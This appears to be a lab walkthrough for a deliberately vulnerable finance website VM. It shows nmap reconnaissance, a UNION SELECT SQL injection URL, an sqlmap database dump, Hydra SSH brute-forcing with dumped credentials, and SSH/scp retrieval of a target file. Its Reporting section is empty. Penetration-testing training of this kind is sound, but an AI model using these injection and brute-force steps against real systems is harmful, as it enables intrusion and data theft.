.. _dinero:

Dinero - A Vulnerable Finance Website
=====================================
*"Dinero is a financial institution that provide multiple services, such as financial management and auditing.*

*Recently, there have been rumours that the CEO of Dinero, Juarez White, stole Ronald McChicken (RMC)'s classified 11-Secret-Herbs-And-Spices recipe.*
*Since this document is classified, and if the rumours were true, Juarez White would be penalized according to the law.*

*Investigators have a good reason to suspect that the document is hidden within Dinero's internal servers.*
*And so, they seized it.*

*You are one of the investigators, tasked to break into the server in any means possible.*
*Your task is to* **find that recipe**, **recover it** *without tampering the file itself, and* **write a report** *explaining your methodology, vulnerabilities exploited, and recommended mitigations."*

Pre-Enggagements
----------------

Setting up the server
~~~~~~~~~~~~~~~~~~~~~

.. note::

    Visit the :ref:`download center <download-center>` to download VMWare Workstation Player, Kali Linux VM, and Dinero VM.

In order to do our job properly, let us setup the server in our local VMWare Network.
Follow the instructions in :ref:`download center <download-center>` in order to setup the server.

We will utilize :ref:`Kali Linux VM <download-center>` to test this server.

Testing Type
~~~~~~~~~~~~
This will be a **Black Box Testing**, since this is a server that has been seized.
We will treat this server as something new that we know nothing about.

Testing Boundaries
~~~~~~~~~~~~~~~~~~
We will limit the test to the **services available within every open port**, and the **home directory of every user** that we found.
Everything else is restricted, and will not be touched.

Any files that we found can be read, but not write.
This means **editing or tampering files are strictly prohibited**.

Information Gathering
---------------------

Finding the target
~~~~~~~~~~~~~~~~~~
To find the target's IP Address, we will leverage VMWare's NAT capabilities.
By setting the simulation within VMWare's NAT-based network, we can isolate every IP that we come across.

First, find out our network address. We can achieve this by running ``ifconfig`` in our Kali.

.. code-block:: console

    > ifconfig

    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.233.131  netmask 255.255.255.0  broadcast 192.168.233.255
        inet6 fe80::20c:29ff:fec9:e51b  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:c9:e5:1b  txqueuelen 1000  (Ethernet)
        RX packets 72  bytes 7581 (7.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68  bytes 9262 (9.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

The result shows ``IP Address: 192.168.233.131`` and ``Subnet: 255.255.255.0``.
This can tell us the network address, which is ``192.168.233.0/24``.

Now we can scan throughout the network address. We will be using :ref:`Nmap<nmappage>` to conduct the scanning process.

.. code-block:: console

    > sudo nmap 192.168.233.0/24

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 00:59 EDT
    Nmap scan report for 192.168.233.1
    Host is up (0.0016s latency).
    All 1000 scanned ports on 192.168.233.1 are in ignored states.
    Not shown: 1000 filtered tcp ports (no-response)
    MAC Address: 00:50:56:C0:00:08 (VMware)

    Nmap scan report for 192.168.233.2
    Host is up (0.0011s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    53/tcp open  domain
    MAC Address: 00:50:56:F6:D5:14 (VMware)

    Nmap scan report for 192.168.233.128
    Host is up (0.0019s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql
    MAC Address: 00:0C:29:0C:D0:1D (VMware)

    Nmap scan report for 192.168.233.254
    Host is up (0.00037s latency).
    All 1000 scanned ports on 192.168.233.254 are in ignored states.
    Not shown: 1000 filtered tcp ports (no-response)
    MAC Address: 00:50:56:E5:53:87 (VMware)

    Nmap scan report for 192.168.233.131
    Host is up (0.000018s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh

    Nmap done: 256 IP addresses (5 hosts up) scanned in 7.76 seconds

We have found 5 IPs. We can isolate our target by sifting these 5 IPs.

- ``192.168.233.1`` is our host machine.
- ``192.168.233.2`` is VMWare NAT device.
- ``192.168.233.254`` is our DHCP server.
- ``192.168.233.131`` is our Kali machine.

Thus, ``192.168.233.128`` is our target.

.. important::

    Make sure your VMs are set to NAT networking. This is to isolate their locations within the VMWare's network.

Scanning Operating System
~~~~~~~~~~~~~~~~~~~~~~~~~
We can also utilize :ref:`Nmap<nmappage>` to find out what operating system this server is running.
We will be using the ``-O`` argument, which is used to scan for operating system fingerprints.

.. code-block:: console

    > sudo nmap 192.168.233.128 -O

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 01:10 EDT
    Nmap scan report for 192.168.233.128
    Host is up (0.0020s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql
    MAC Address: 00:0C:29:0C:D0:1D (VMware)
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.6
    Network Distance: 1 hop

    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds

From the scan results, we found out that this server runs ``Linux``.

Enumerating Open Ports
~~~~~~~~~~~~~~~~~~~~~~
Servers tend to have open ports in order to expose their services.
We could enumerate these ports to find out what kinds of services this server has exposed.

We can use :ref:`Nmap<nmappage>` to scan these ports.
We will be using ``-p -`` argument, to scan every port (0 - 65535).
We will also be using ``-sV`` argument to scan its software versions.

.. code-block:: console

    > sudo nmap 192.168.233.128 -p - -sV

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 01:11 EDT
    Nmap scan report for 192.168.233.128
    Host is up (0.0020s latency).
    Not shown: 65531 closed tcp ports (reset)
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
    3306/tcp  open  mysql   MySQL 5.7.37-0ubuntu0.18.04.1
    23401/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    MAC Address: 00:0C:29:0C:D0:1D (VMware)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 21.13 seconds

From the scan results, we have found that:

- Port ``80`` and ``23401`` contain Apache httpd servers. 
- Port ``22`` contains an OpenSSH server.
- Port ``3306`` contains a MySql server.

By exploring the Apache httpd services, we can locate Dinero's website in Port ``23401``.

.. image:: /images/dinero23401.png

Vulnerability Analysis
----------------------
By exploring Dinero's website, we will find a page that showcases Dinero's services.

This page works by sending an ``id`` using ``GET`` request.
The ``id`` will be appended inside an unprepared SQL query on the backend side, which will then be executed.
The result of the execution will be reflected on the website.

By injecting SQL syntaxes within the ``GET`` request (by modifying the url), we can directly modify the query on the backend side, essentially allowing us to query whatever we want.

To prove this, we can append ``UNION SELECT 1,2,3,4,5 ORDER BY 1`` at the back of the ``id`` parameter within the url.

``http://192.168.233.128:23401/service.php?id=6 UNION SELECT 1,2,3,4,5 ORDER BY 1``

.. image:: /images/dineromanualsqlinjection.png

This will append ``1 2 3 4 5`` into the top of the query result.
By doing this, we can confirm the amount of columns ``5``, and the position of the data presentation on the website.

by replacing the numbers with other queries (such as ``database()``), we can display the query result directly on the website.

.. note::

    This does not always work. If the query is prepared within a statement, every parameter appended will be converted to literal string, making the syntaxes invalid.

    We can work around this by using Blind-SQLInjection, although this require more time and effort.

Exploitation
------------

Exploit SQL Injection Vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Now that we know there is a page vulnerable to SQL Injection, we can attack it by using :ref:`SQLMap<sqlmap>`.

We will use ``--dump`` argument to dump every data we found.
We will also use ``--output-dir`` argument to set the output location.

.. code-block:: console

     > mkdir sqlmapdump
     > sudo sqlmap -u http://192.168.233.128:23401/service.php?id=6 --dump --output-dir=./sqlmapdump
            ___
           __H__
     ___ ___[)]_____ ___ ___  {1.6#stable}
    |_ -| . [(]     | .'| . |
    |___|_  ["]_|_|_|__,|  _|
        |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 01:32:36 /2022-06-18/
    [...]
    [...]
    [01:33:05] [INFO] fetched data logged to text files under '/home/kali/sqlmapdump/192.168.233.128'

    [*] ending @ 01:33:05 /2022-06-18/

We can find our dump files in ``sqlmapdump/192.168.233.128/dump/dinero_db``.

Bruteforcing SSH Server
~~~~~~~~~~~~~~~~~~~~~~~
If we look into ``team_member.csv``, we will find some credentials that we can try on the SSH server.

.. image:: /images/members.png

We can use :ref:`Hydra<hydra>` to bruteforce the SSH server.

In order to use :ref:`Hydra<hydra>`, we need to supply it with username and password lists.
We can separate the two into different files, or combine them using the format ``username:password`` for every line.

.. code-block:: console

    > cat usernamepasslist.txt

    juarez:D!@D3105T0nt05
    sarahj:S@R@H1Tm@n24u
    wanderson122:12215myf120rit3NuMB@@RR
    jepson:J3p50Nap5P@55w0rd

We will be using ``-C`` argument to supply :ref:`Hydra<hydra>` with a combined wordlist of username and password.

.. code-block:: console

    > hydra ssh://192.168.233.128 -C usernamepasslist.txt

    Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-18 01:47:56
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries, ~1 try per task
    [DATA] attacking ssh://192.168.233.128:22/
    [22][ssh] host: 192.168.233.128   login: juarez   password: D!@D3105T0nt05
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-18 01:47:59

The result is that we found ``Username: juarez`` and ``Password: D!@D3105T0nt05``.

Post-Exploitation
-----------------
Using the credentials that we found, we can simply login via SSH.

Looking for the File
~~~~~~~~~~~~~~~~~~~~

.. code-block:: console

    > ssh juarez@192.168.233.128 -p 22

    juarez@192.168.233.128's password: D!@D3105T0nt05
    Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-176-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage
    New release '20.04.4 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.

    Last login: Fri Jun 10 07:32:09 2022 from 192.168.233.1
    juarez@dinero:~$

Looking around, we can find our target file in ``vault/``.

.. code-block:: console

    juarez@dinero:~$ ls vault/

    '[CLASSIFIED]elevensecretherbsandspices.txt'

Downloading the File
~~~~~~~~~~~~~~~~~~~~
To download the file, simply use the command ``scp``.

.. code-block:: console

    > scp juarez@192.168.233.128:~/vault/[CLASSIFIED]elevensecretherbsandspices.txt /
    juarez@192.168.233.128's password: D!@D3105T0nt05

.. image:: /images/ronald.png

Reporting
---------